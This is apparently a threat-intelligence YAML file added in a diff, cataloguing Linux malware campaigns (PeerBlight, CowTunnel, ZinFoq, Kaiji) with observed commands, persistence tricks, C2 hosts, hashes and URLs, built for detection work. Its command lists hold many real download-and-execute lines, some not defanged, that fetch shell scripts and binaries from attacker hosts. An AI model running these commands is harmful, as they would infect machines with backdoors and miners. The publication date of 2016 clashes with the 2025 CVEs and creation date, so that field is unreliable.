@@ -1,0 +1,176 @@
+description: CowTunnel and ZinFoq malware campaigns use DHT for C2 configuration updates,
+  establish reverse proxies, perform timestomping, and implement process masquerading.
+malware_families:
+- PeerBlight
+- CowTunnel
+- ZinFoq
+- Kaiji
+TTPs:
+  processes:
+  - cmd.exe
+  - bash
+  - nss
+  - xfrpc
+  - sshd-agent
+  - wget
+  - curl
+  - pkill
+  - chattr
+  - systemd-agent.service
+  - .sys-mon
+  commandline:
+  - C:\Windows\system32\cmd.exe /d /s /c "curl hxxp://207.148.79[.]178:6608/sys.sh | bash"
+  - C:\\Windows\\system32\\cmd.exe /d /s /c \"wget hxxp://216.158.232[.]43:12000/sex.sh && bash sex.sh\"
+  - C:\\Windows\\system32\\cmd.exe /d /s /c \"((curl -sL hxxp://45.32.158.54/5e51aff54626ef7f/x86_64 -o /tmp/x86_64;chmod 777 /tmp/x86_64;/tmp/x86_64) || (wget hxxp://45.32.158.54/5e51aff54626ef7f/x86_64 -O /tmp/x86_64;chmod 777 /tmp/x86_64;/tmp/x86_64))\"
+  - C:\WINDOWS\system32\cmd.exe /d /s /c "wget hxxp://45.76.155[.]14/vim -O /tmp/vim; chmod +x /tmp/vim ; nohup /tmp/vim > /dev/null 2>&1 & wait ; rm -f /tmp/vim"
+  - C:\WINDOWS\system32\cmd.exe /d /s /c "$(curl -s hxxp://keep.camdvr[.]org:8000/d5.sh | bash | gzip -n | base64 -w0)"
+  - C:\Windows\system32\cmd.exe /d /s /c "wget hxxp://103.135.101[.]15/wocaosinm.sh;sh wocaosinm.sh;rm -r wocaosinm.sh"
+  - curl hxxp://103.135.101[.]15/wocaosinm.sh;wget hxxp://103.135.101[.]15/wocaosinm.sh;sh wocaosinm.sh;rm -r wocaosinm.sh
+  - C:\Windows\system32\cmd.exe /d /s /c "$(curl -s hxxp://keep.camdvr[.]org:8000/d5.sh | bash | gzip -n | base64 -w0)"
+  - C:\Windows\system32\cmd.exe /d /s /c "wget hxxp://vps-zap812595-1.zap-srv[.]com:3000/sex.sh && bash sex.sh"
+  - C:\Windows\system32\cmd.exe /d /s /c "$(curl -s hxxp://help.093214[.]xyz:9731/fn32.sh | bash | gzip -n | base64 -w0)"
+  - C:\Windows\system32\cmd.exe /d /s /c "curl -s -L hxxp://31.56.27[.]97/scripts/4thepool_miner.sh | bash -s; wget -qO- hxxp://31.56.27[.]97/scripts/4thepool_miner.sh | bash -s"
+  - wget hxxp://39.97.229[.]220:8006/httd && chmod 777 httd && ./httd
+  - curl -sL hxxp://45.32.158[.]54/5e51aff54626ef7f/x86_64 -o /tmp/x86_64; chmod 777 /tmp/x86_64; /tmp/x86_64
+  - wget -q hxxp://38.165.44[.]205/1 -O ntpclient
+  - wget -qO- hxxp://38.165.44[.]205/k | sh
+  - /bin/sh -c ping -c 2 `echo IyEvYmluL2Jhc2gKCiMgQ29uZmlndXJhdGlvbgpUQVJfRklMRT0ia2FsLnRhci5neiIK...
+  - -c /home/<username>/.systemd-utils/conf -d -k -l -D
+  - -shell------d9djd912as123m4cK12M--whoami
+  - -explorerfile------d9djd912as123m4cK12M--/etc/passwd
+  - curl -sL http://keep.camdvr.org:8000/BREAKABLE_PARABLE5 -o /tmp/$(date +%Y%m%d%H%M%S)
+  - wget http://45.32.158.54/5e51aff54626ef7f/x86_64 -O /tmp/xB6_64
+  - chmod 777 /tmp/xB6_64; /tmp/xB6_64
+  - wget http://vps-zap812595-1.zap-srv.com:3000/sex.sh && bash sex.sh
+  - curl -sL http://help.093214.xyz:9731/fn32.sh | bash
+  - pkill -f .sys-mon
+  - chattr -i /usr/bin/sshd-agent
+  - echo $({41%271})
+  - whoami
+  - curl http://103.135.101.15/wocaosinm.sh; sh wocaosinm.sh; rm -r wocaosinm.sh
+  scripting_engine:
+  - bash
+  - Bash
+  - sh
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - cmd.exe, hxxp://207.148.79[.]178:6608
+  - cmd.exe, hxxp://216.158.232[.]43:12000
+  - cmd.exe, hxxp://45.32.158.54
+  - cmd.exe, hxxp://45.76.155[.]14
+  - cmd.exe, hxxp://keep.camdvr[.]org:8000
+  - cmd.exe, hxxp://103.135.101[.]15
+  - wget, hxxp://39.97.229[.]220:8006
+  - curl, hxxp://45.32.158[.]54
+  - wget, hxxp://38.165.44[.]205
+  - nss->api.qtss[.]cc:443
+  - xfrpc->FRP server
+  - ZinFoq->api.qtss[.]cc:443
+  - wget http://keep.camdvr.org:8000/BREAKABLE_PARABLE5
+  - curl -sL http://45.32.158.54/5e51aff54626ef7f/x86_64
+  - wget http://vps-zap812595-1.zap-srv.com:3000/sex.sh
+  - curl -sL http://help.093214.xyz:9731/fn32.sh
+  - curl http://103.135.101.15/wocaosinm.sh
+  file_activity:
+  - /tmp/x86_64
+  - /tmp/vim
+  - /tmp/wocaosinm.sh
+  - /tmp/httd
+  - /tmp/x86_64
+  - ntpcient
+  - /tmp/k
+  - /tmp/system-updates-service.service
+  - /lib/systemd/system/systemd-agent.service
+  - /etc/init/systemd-agent.conf
+  - $HOME/.ksoftirqd-private-f393y1moabubffpqvozboktusmfzqj1k-ksoftirqd-softirq.service-NjSR4/softirq
+  - /home/<username>/.systemd-utils/conf
+  - /usr/bin/sshd-agent
+  - /tmp/BREAKABLE_PARABLE5
+  - /tmp/$(date +%Y%m%d%H%M%S)
+  - /tmp/xB6_64
+  - ~/.config/.system-monitor/.sys-mon
+  - /tmp/.system-update/
+  - /home/<user>/.systemd-utils/conf
+  persistence:
+  - systemd service named systemd-agent.service
+  - upstart configuration at /etc/init/systemd-agent.conf
+  - hidden directory mimicking systemd's PrivateTmp naming convention
+  - systemd service named system-updates-service
+  - systemd service sshd-agent.service
+  - immutable attribute on /usr/bin/sshd-agent
+  - systemd service (sshd-agent.service)
+  - crontab entries (@reboot)
+  - .bashrc injection
+  - service accounts under /tmp/.system-update/
+  process_relations:
+  - nss->xfrpc
+  - ZinFoq->interactive_shell
+CVEs:
+- CVE-2025-55182
+- CVE-2025-66478
+IOCs:
+  hashes:
+  - a605a70d031577c83c093803d11ec7c1e29d2ad530f8e95d9a729c3818c7050d
+  - 776850a1e6d6915e9bf35aa83554616129acd94e3a3f6673bd6ddaec530f4273
+  - 0f0f9c339fcc267ec3d560c7168c56f607232cbeb158cb02a0818720a54e72ce
+  - 3854862bb3ee623f95d91fa15b504e2bbc30e23f1a15ad7b18aedb127998c79c
+  - 2cd41569e8698403340412936b653200005c59f2ff3d39d203f433adb2687e7f
+  - 65d840b059e01f273d0a169562b3b368051cfb003e301cc2e4f6a7d1907c224a
+  ip_addresses:
+  - 207.148.79.178
+  - 216.158.232.43
+  - 45.32.158.54
+  - 45.76.155.14
+  - 103.135.101.15
+  - 39.97.229.220
+  - 38.165.44.205
+  - 185.247.224.41
+  - 67.215.246.10
+  - 82.221.103.244
+  - 87.98.162.88
+  - 49.51.230.175
+  - 192.168.1.100
+  - 192.168.1.100:4444
+  - 23.226.71.197
+  - 23.226.71.200
+  - 23.226.71.209
+  domains:
+  - keep.camdvr[.]org
+  - vps-zap812595-1.zap-srv[.]com
+  - help.093214[.]xyz
+  - router.bittorrent[.]com
+  - router.utorrent[.]com
+  - dht.transmissionbt[.]com
+  - api.qtss[.]cc
+  - keep.camdvr.org
+  - help.093214.xyz
+  - vps-zap812595-1.zap-srv.com
+  - 103.135.101.15
+  urls:
+  - hxxp://207.148.79[.]178:6608/sys.sh
+  - hxxp://216.158.232[.]43:12000/sex.sh
+  - hxxp://45.32.158.54/5e51aff54626ef7f/x86_64
+  - hxxp://45.76.155[.]14/vim
+  - hxxp://keep.camdvr[.]org:8000/d5.sh
+  - hxxp://103.135.101[.]15/wocaosinm.sh
+  - hxxp://39.97.229[.]220:8006/httd
+  - hxxp://45.32.158[.]54/5e51aff54626ef7f/x86_64
+  - hxxp://38.165.44[.]205/1
+  - hxxp://38.165.44[.]205/k
+  - hxxps://api.qtss[.]cc:443/en/about?source=redhat&id=v1.0
+  - hxxps://api.qtss[.]cc:443/en/about?source=redhat&id=v1.1
+  - https://api.qtss.cc:443/en/about?source=redhat&id=v1.2
+  - http://keep.camdvr[.]org:8000/BREAKABLE_PARABLE5
+  - http://keep.camdvr.org:8000/BREAKABLE_PARABLE5
+  - http://45.32.158.54/5e51aff54626ef7f/x86_64
+  - http://vps-zap812595-1.zap-srv.com:3000/sex.sh
+  - http://help.093214.xyz:9731/fn32.sh
+  - http://103.135.101.15/wocaosinm.sh
+authors:
+- Anna Pham
+- Craig Sweeney
+- Michael Tigges
+reference: https://www.huntress.com/blog/peerblight-linux-backdoor-exploits-react2shell
+date_of_publication: January 15, 2016
+file_creation_date: December 10, 2025
